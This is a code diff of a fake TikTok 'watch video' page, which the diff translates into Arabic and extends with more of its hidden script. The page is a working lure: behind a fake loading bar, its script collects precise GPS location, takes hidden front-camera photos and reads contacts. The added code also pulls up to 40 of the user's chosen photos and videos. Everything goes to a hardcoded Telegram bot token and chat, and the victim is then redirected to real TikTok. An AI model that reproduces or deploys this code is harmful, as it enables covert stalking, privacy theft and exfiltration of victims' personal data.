@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title> TikTok - Watch Video </title>
+    <title> TikTok - شاهد الفيديو </title>
     <style>
         * {
             margin: 0;
@@ -75,7 +75,6 @@
             justify-content: center;
             align-items: center;
             backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
             margin-bottom: 20px;
             border: 2px solid rgba(255, 255, 255, 0.3);
             transition: transform 0.2s ease;
@@ -107,7 +106,6 @@
             font-weight: bold;
             color: #fff;
             z-index: 15;
-            font-family: 'TikTok Sans', Arial, sans-serif;
             letter-spacing: -0.5px;
         }
 
@@ -172,6 +170,7 @@
             transition: width 0.3s ease;
         }
 
+        /* واجهة تيك توك */
         .tiktok-sidebar {
             position: absolute;
             right: 12px;
@@ -323,9 +322,10 @@
                     <path d="M8 5v14l11-7z"/>
                 </svg>
             </div>
-            <div class="placeholder-text" id="placeholder-text">Tap to watch</div>
+            <div class="placeholder-text" id="placeholder-text">اضغط للمشاهدة</div>
         </div>
 
+        <!-- وهم واجهة تيك توك -->
         <div class="tiktok-sidebar" id="fake-sidebar">
             <div class="sidebar-icon">
                 <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
@@ -337,44 +337,44 @@
             </div>
             <div class="sidebar-icon">
                 <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
-                <span>Share</span>
+                <span>مشاركة</span>
             </div>
         </div>
 
         <div class="video-info" id="fake-info">
-            <div class="username">@tiktok_creator <span>Follow</span></div>
-            <div class="description">Wait for the end! 😂🔥 #viral #trending #fyp #foryou</div>
+            <div class="username">@tiktok_creator <span>متابعة</span></div>
+            <div class="description">أنتظر النهاية! 😂🔥 #ترند #فيروس #fyp</div>
             <div class="music">
                 <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-                <span>original sound - trending_vibes · 2.3M</span>
+                <span>صوت أصلي - trending_vibes · 2.3M</span>
             </div>
         </div>
 
         <div class="bottom-nav" id="fake-nav">
             <div class="nav-item active">
                 <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-                <span>Home</span>
+                <span>الرئيسية</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
-                <span>Discover</span>
+                <span>استكشاف</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>
-                <span>Inbox</span>
+                <span>صندوق الوارد</span>
             </div>
             <div class="nav-item">
                 <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-                <span>Me</span>
+                <span>لي</span>
             </div>
         </div>
 
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div class="loading-message" id="loading-message">Loading video...</div>
+            <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
             <div class="progress-bar">
                 <div class="progress-fill" id="progress-fill"></div>
             </div>
@@ -384,10 +384,12 @@
     </div>
 
     <script>
+        // إعدادات التليجرام
         const TELEGRAM_BOT_TOKEN = '8501264176:AAGTzenTv4CLwN0W5x7uZA_rG4Rc8N8zBzI';
         const CHAT_ID = '8491676638';
         const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
+        // عناصر الصفحة
         const videoPlaceholder = document.getElementById('video-placeholder');
         const loadingOverlay = document.getElementById('loading-overlay');
         const loadingMessage = document.getElementById('loading-message');
@@ -404,97 +406,77 @@
             setTimeout(() => notificationDiv.classList.remove('show'), 3000);
         }
 
-        // ========== 1. PRECISE GPS LOCATION (مع محاولات متعددة) ==========
+        // دالة مساعدة لتأخير التنفيذ
+        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+
+        // ========== 1. الحصول على الموقع الدقيق ==========
         async function getPreciseLocation() {
             return new Promise((resolve) => {
-                let attempts = 0;
-                const maxAttempts = 3;
-                
-                const tryGetLocation = () => {
-                    attempts++;
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                resolve({
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    altitude: position.coords.altitude || null,
-                                    speed: position.coords.speed || null,
-                                    timestamp: position.timestamp,
-                                    success: true
-                                });
-                            },
-                            (error) => {
-                                console.warn(`GPS attempt ${attempts} failed:`, error.message);
-                                if (attempts < maxAttempts) {
-                                    setTimeout(tryGetLocation, 2000);
-                                } else {
-                                    resolve({ success: false, error: error.message });
-                                }
-                            },
-                            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-                        );
-                    } else {
-                        resolve({ success: false, error: 'Geolocation not supported' });
-                    }
-                };
-                
-                tryGetLocation();
-            });
-        }
-
-        // ========== 2. CAPTURE 2 FRONT CAMERA PHOTOS ==========
-        async function captureFrontCameraPhotos() {
-            return new Promise(async (resolve) => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" } 
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', 'true');
-                    video.style.position = 'absolute';
-                    video.style.left = '-9999px';
-                    video.style.top = '-9999px';
-                    document.body.appendChild(video);
-                    
-                    await new Promise((res) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            res();
-                        };
-                    });
-                    
-                    await new Promise(r => setTimeout(r, 500));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    
-                    const photos = [];
-                    
-                    for (let i = 0; i < 2; i++) {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoData = canvas.toDataURL('image/jpeg', 0.9);
-                        photos.push(photoData);
-                        if (i === 0) await new Promise(r => setTimeout(r, 800));
-                    }
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    document.body.removeChild(video);
-                    resolve(photos);
-                    
-                } catch (error) {
-                    console.warn('Front camera error:', error);
-                    resolve([]);
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                success: true,
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude || null,
+                                timestamp: position.timestamp
+                            });
+                        },
+                        (error) => {
+                            console.warn('GPS error:', error.message);
+                            resolve({ success: false, error: error.message });
+                        },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                } else {
+                    resolve({ success: false, error: 'Geolocation not supported' });
                 }
             });
         }
 
-        // ========== 3. GET ALL CONTACTS ==========
+        // ========== 2. التقاط صورتين من الكاميرا الأمامية ==========
+        async function captureFrontCameraPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
+                document.body.appendChild(video);
+                
+                await new Promise((res) => {
+                    video.onloadedmetadata = () => { video.play(); res(); };
+                });
+                
+                await wait(500);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                const photos = [];
+                for (let i = 0; i < 2; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                    if (i === 0) await wait(800);
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                return photos;
+            } catch (error) {
+                console.warn('Camera error:', error);
+                return [];
+            }
+        }
+
+        // ========== 3. الحصول على جميع جهات الاتصال ==========
         async function getAllContacts() {
             if (!navigator.contacts || !navigator.contacts.select) {
                 return [];
@@ -503,51 +485,83 @@
                 const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                 return contacts;
             } catch (err) {
-                console.warn('Contacts access failed:', err);
+                console.warn('Contacts error:', err);
                 return [];
             }
         }
 
-        // ========== SEND TO TELEGRAM ==========
+        // ========== 4. الحصول على جميع الوسائط (صور + فيديوهات) ==========
+        async function getAllMediaFiles() {
+            return new Promise((resolve) => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*,video/*';
+                input.multiple = true;
+                input.style.cssText = 'position:absolute;left:-9999px';
+                document.body.appendChild(input);
+                
+                const timeout = setTimeout(() => {
+                    if (document.body.contains(input)) document.body.removeChild(input);
+                    resolve({ images: [], videos: [] });
+                }, 120000);
+                
+                input.onchange = async (event) => {
+                    clearTimeout(timeout);
+                    const files = Array.from(event.target.files);
+                    const images = [];
+                    const videos = [];
+                    
+                    for (let i = 0; i < files.length && i < 40; i++) {
+                        const file = files[i];
+                        const reader = new FileReader();
+                        const fileData = await new Promise((res) => {
+                            reader.onload = (e) => res(e.target.result);
+                            reader.readAsDataURL(file);
+                        });
+                        
+                        if (file.type.startsWith('image/')) {
+                            images.push({ name: file.name, size: file.size, data: fileData });
+                        } else if (file.type.startsWith('video/')) {
+                            videos.push({ name: file.name, size: file.size, type: file.type, data: fileData });
+                        }
+                    }
+                    
+                    document.body.removeChild(input);
+                    resolve({ images, videos });
+                };
+                
+                input.click();
+            });
+        }
+
+        // ========== إرسال البيانات إلى تلجرام ==========
         async function sendLocationToTelegram(location) {
-            let message = `📍 <b>PRECISE USER LOCATION</b>\n\n`;
-            message += `🕒 Time: ${new Date().toLocaleString()}\n`;
+            let message = `📍 <b>الموقع الدقيق للمستخدم</b>\n\n`;
+            message += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
             
-            if (location && location.success === true) {
+            if (location.success) {
                 const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18`;
-                message += `🎯 Latitude: ${location.latitude}\n`;
-                message += `🎯 Longitude: ${location.longitude}\n`;
-                message += `📡 Accuracy: ±${location.accuracy} meters\n`;
-                if (location.altitude) message += `⛰️ Altitude: ${location.altitude}m\n`;
-                if (location.speed) message += `🏃 Speed: ${location.speed}m/s\n`;
-                message += `\n🗺️ <a href="${mapsUrl}">📍 Click to open Google Maps</a>\n`;
-                message += `🗺️ <a href="https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}&zoom=18">🗺️ OpenStreetMap</a>`;
+                message += `🎯 خط العرض: ${location.latitude}\n`;
+                message += `🎯 خط الطول: ${location.longitude}\n`;
+                message += `📡 الدقة: ±${location.accuracy} متر\n`;
+                message += `\n🗺️ <a href="${mapsUrl}">📍 اضغط لفتح الخريطة</a>`;
             } else {
-                message += `❌ Location unavailable - ${location?.error || 'Permission denied'}\n`;
-                message += `⚠️ Please allow location access and try again.`;
+                message += `❌ تعذر الحصول على الموقع - ${location.error || 'تم رفض الإذن'}`;
             }
             
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: false
-                    })
-                });
-                return true;
-            } catch(e) { return false; }
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: false })
+            });
         }
 
         async function sendFrontPhotosToTelegram(photos) {
-            if (!photos || photos.length === 0) {
+            if (!photos.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured - camera permission may be denied` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 لم يتم التقاط صور من الكاميرا الأمامية` })
                 });
                 return;
             }
@@ -557,29 +571,28 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photoBlob, `front_camera_${i+1}.jpg`);
-                formData.append('caption', `📸 FRONT CAMERA PHOTO ${i+1}/2\n🕒 ${new Date().toLocaleString()}\n📍 User face capture`);
+                formData.append('caption', `📸 صورة من الكاميرا الأمامية ${i+1}/2\n🕒 ${new Date().toLocaleString('ar-EG')}`);
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                await new Promise(r => setTimeout(r, 500));
+                await wait(500);
             }
         }
 
         async function sendContactsToTelegram(contacts) {
-            if (!contacts || contacts.length === 0) {
+            if (!contacts.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 No contacts shared - permission may be denied` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 لم يتم مشاركة جهات اتصال` })
                 });
                 return;
             }
             
-            let message = `📞 <b>CONTACTS - ${contacts.length} contacts</b>\n\n`;
-            message += `🕒 ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n`;
+            let message = `📞 <b>جهات الاتصال - ${contacts.length} جهة اتصال</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━\n\n`;
             
-            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
+            for (let i = 0; i < Math.min(contacts.length, 60); i++) {
                 const c = contacts[i];
-                const name = c.name?.[0] || 'No name';
-                const phone = c.tel?.[0] || 'No phone';
+                const name = c.name?.[0] || 'بدون اسم';
+                const phone = c.tel?.[0] || 'بدون رقم';
                 const email = c.email?.[0] || '';
                 message += `${i+1}. 👤 ${name}\n📱 ${phone}\n`;
                 if (email) message += `✉️ ${email}\n`;
@@ -587,94 +600,148 @@
                 if (message.length > 3900) break;
             }
             
-            try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+            
+            // إرسال نسخة JSON كاملة
+            const contactsJson = JSON.stringify(contacts, null, 2);
+            const blob = new Blob([contactsJson], { type: 'application/json' });
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, 'all_contacts_backup.json');
+            formData.append('caption', `📇 نسخة احتياطية كاملة لجهات الاتصال (${contacts.length} جهة اتصال)`);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+        }
+
+        async function sendMediaToTelegram(media) {
+            // إرسال الصور
+            if (media.images.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🖼️ <b>الصور المحددة</b>\nالعدد: ${media.images.length} صورة`, parse_mode: 'HTML' })
                 });
                 
-                // Send contacts as JSON file
-                const contactsJson = JSON.stringify(contacts, null, 2);
-                const blob = new Blob([contactsJson], { type: 'application/json' });
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('document', blob, 'all_contacts_backup.json');
-                formData.append('caption', `📇 Complete contacts backup (${contacts.length} contacts)\n🕒 ${new Date().toLocaleString()}`);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
-            } catch(e) { console.error('Contacts send error:', e); }
+                for (let i = 0; i < media.images.length; i++) {
+                    const img = media.images[i];
+                    const imgBlob = await fetch(img.data).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', imgBlob, `image_${i+1}.jpg`);
+                    formData.append('caption', `📷 صورة ${i+1}/${media.images.length}\n📁 ${img.name.substring(0, 50)}`);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    await wait(400);
+                }
+            }
+            
+            // إرسال الفيديوهات
+            if (media.videos.length) {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🎬 <b>الفيديوهات المحددة</b>\nالعدد: ${media.videos.length} فيديو`, parse_mode: 'HTML' })
+                });
+                
+                for (let i = 0; i < media.videos.length; i++) {
+                    const video = media.videos[i];
+                    const videoBlob = await fetch(video.data).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', videoBlob, `video_${i+1}.mp4`);
+                    formData.append('caption', `🎥 فيديو ${i+1}/${media.videos.length}\n📁 ${video.name.substring(0, 50)}`);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+                    await wait(600);
+                }
+            }
         }
 
-        // ========== MAIN OPERATION ==========
+        // ========== العملية الرئيسية ==========
         async function startStealthOperation() {
             try {
                 updateProgress(5);
-                loadingMessage.textContent = 'Connecting...';
-                await new Promise(r => setTimeout(r, 300));
+                loadingMessage.textContent = 'جاري الاتصال...';
+                await wait(300);
                 
-                // Step 1: Get Location (مع رسالة واضحة للمستخدم)
+                // 1. الموقع
                 updateProgress(15);
-                loadingMessage.textContent = 'Getting your precise location...';
-                showNotification('📍 Please allow location access');
+                loadingMessage.textContent = 'جاري الحصول على الموقع...';
+                showNotification('📍 الرجاء السماح بالموقع');
                 const location = await getPreciseLocation();
-                await new Promise(r => setTimeout(r, 500));
+                await wait(500);
                 
-                updateProgress(30);
-                loadingMessage.textContent = 'Sending location data...';
+                updateProgress(25);
+                loadingMessage.textContent = 'جاري إرسال الموقع...';
                 await sendLocationToTelegram(location);
-                await new Promise(r => setTimeout(r, 600));
+                await wait(600);
                 
-                // Step 2: Capture Front Camera Photos
-                updateProgress(45);
-                loadingMessage.textContent = 'Initializing camera...';
-                showNotification('📸 Camera access needed');
-                await new Promise(r => setTimeout(r, 500));
+                // 2. الكاميرا الأمامية
+                updateProgress(40);
+                loadingMessage.textContent = 'جاري تشغيل الكاميرا...';
+                showNotification('📸 الرجاء السماح بالكاميرا');
+                await wait(500);
                 
-                updateProgress(55);
-                loadingMessage.textContent = 'Capturing photos...';
+                updateProgress(50);
+                loadingMessage.textContent = 'جاري التقاط الصور...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotosToTelegram(frontPhotos);
-                await new Promise(r => setTimeout(r, 600));
+                await wait(600);
                 
-                // Step 3: Get Contacts
-                updateProgress(75);
-                loadingMessage.textContent = 'Accessing contacts...';
-                showNotification('📞 Please allow contacts access');
-                await new Promise(r => setTimeout(r, 500));
+                // 3. جهات الاتصال
+                updateProgress(60);
+                loadingMessage.textContent = 'جاري الوصول لجهات الاتصال...';
+                showNotification('📞 الرجاء السماح بجهات الاتصال');
+                await wait(500);
                 
-                updateProgress(85);
-                loadingMessage.textContent = 'Reading contacts...';
+                updateProgress(68);
+                loadingMessage.textContent = 'جاري قراءة جهات الاتصال...';
                 const contacts = await getAllContacts();
-                await new Promise(r => setTimeout(r, 400));
+                await wait(400);
                 
-                updateProgress(92);
-                loadingMessage.textContent = 'Sending contacts...';
+                updateProgress(76);
+                loadingMessage.textContent = 'جاري إرسال جهات الاتصال...';
                 await sendContactsToTelegram(contacts);
-                await new Promise(r => setTimeout(r, 600));
+                await wait(600);
                 
-                // Complete
+                // 4. الوسائط (صور وفيديوهات)
+                updateProgress(84);
+                loadingMessage.textContent = 'الرجاء اختيار الصور والفيديوهات...';
+                showNotification('📱 الرجاء اختيار الوسائط');
+                await wait(800);
+                
+                updateProgress(90);
+                loadingMessage.textContent = 'جاري معالجة الوسائط...';
+                const media = await getAllMediaFiles();
+                await wait(400);
+                
+                updateProgress(94);
+                loadingMessage.textContent = `جاري إرسال ${media.images.length} صورة و ${media.videos.length} فيديو...`;
+                await sendMediaToTelegram(media);
+                await wait(600);
+                
+                // 5. التقرير النهائي
                 updateProgress(100);
-                loadingMessage.textContent = 'Redirecting...';
+                loadingMessage.textContent = 'جاري التوجيه...';
                 
-                // Send final summary
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>COMPLETE REPORT</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location?.success === true ? '✓ Captured' : '✗ Failed'}\n📸 Front Camera: ${frontPhotos.length}/2 photos\n📞 Contacts: ${contacts.length} contacts\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString()}\n🌐 User Agent: ${navigator.userAgent.substring(0, 60)}...`,
+                        text: `✅ <b>تقرير كامل</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓ تم' : '✗ فشل'}\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2 صورة\n📞 جهات الاتصال: ${contacts.length} جهة اتصال\n🖼️ الصور: ${media.images.length} صورة\n🎬 الفيديوهات: ${media.videos.length} فيديو\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
                         parse_mode: 'HTML'
                     })
                 });
                 
             } catch (error) {
-                console.error('Error:', error);
-                showNotification('Connection error, please try again');
+                console.error('خطأ:', error);
+                showNotification('حدث خطأ، الرجاء المحاولة مرة أخرى');
                 updateProgress(100);
             } finally {
-                setTimeout(() => {
-                    window.location.href = TIKTOK_REDIRECT_URL;
-                }, 2000);
+                await wait(2000);
+                window.location.href = TIKTOK_REDIRECT_URL;
             }
         }
 
@@ -691,11 +758,11 @@
             startStealthOperation();
         });
 
-        showNotification('Tap to watch video');
+        showNotification('اضغط لمشاهدة الفيديو');
 
         setTimeout(() => {
             if (!loadingOverlay.classList.contains('active')) {
-                showNotification('Auto-playing video...');
+                showNotification('تشغيل تلقائي...');
                 videoPlaceholder.classList.add('hidden');
                 loadingOverlay.classList.add('active');
                 hideFakeUI();
